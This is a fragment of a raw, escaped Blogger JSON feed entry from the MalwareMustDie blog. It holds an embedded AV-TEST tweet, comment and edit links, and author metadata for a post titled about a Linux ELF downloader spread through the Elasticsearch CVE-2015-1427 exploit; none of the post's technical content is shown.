href=\"https:\/\/twitter.com\/hashtag\/CVE?src=hash\"\u003E#CVE\u003C\/a\u003E-2015-1427 \u003Ca href=\"http:\/\/t.co\/JepNsoboPT\"\u003Epic.twitter.com\/JepNsoboPT\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; AV-TEST GmbH (@avtestorg) \u003Ca href=\"https:\/\/twitter.com\/avtestorg\/status\/615414514561994752\"\u003EJune 29, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cp\u003E#MalwareMustDie!"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http:\/\/blog.malwaremustdie.org\/feeds\/3634457454629484029\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2015\/06\/mmd-0034-2015-new-elf.html#comment-form","title":"0 Comments"},{"rel":"edit","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/3634457454629484029"},{"rel":"self","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/3634457454629484029"},{"rel":"alternate","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2015\/06\/mmd-0034-2015-new-elf.html","title":"MMD-0034-2015 - New ELF Linux\/DES.Downloader on Elasticsearch CVE-2015-1427 exploit"}],"author":[{"name":{"$t":"unixfreaxjp"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"/web/20160930230250/http://schemas.google.com/g/2005#thumbnail","width":"32","height":"32","src":"\/\/2.bp.blogspot.com\/-iTSFZlPaBR0\/U5DrOe7GA0I\/AAAAAAAAQL0\/NtZkh4YTXR8\/s113\/*"}}],"media$thumbnail":{"xmlns$media":"/web/20160930230250/http://search.yahoo.com/mrss/","url":"https:\/\/lh3.googleusercontent.com\/-kn67qbGnfyU\/VYvonJEiHVI\/AAAAAAAASHo\/pealRK2Fnng\/s72-c\/001.png","height":"72","width":"72"},"thr$total":{"$t":"0"}}]}});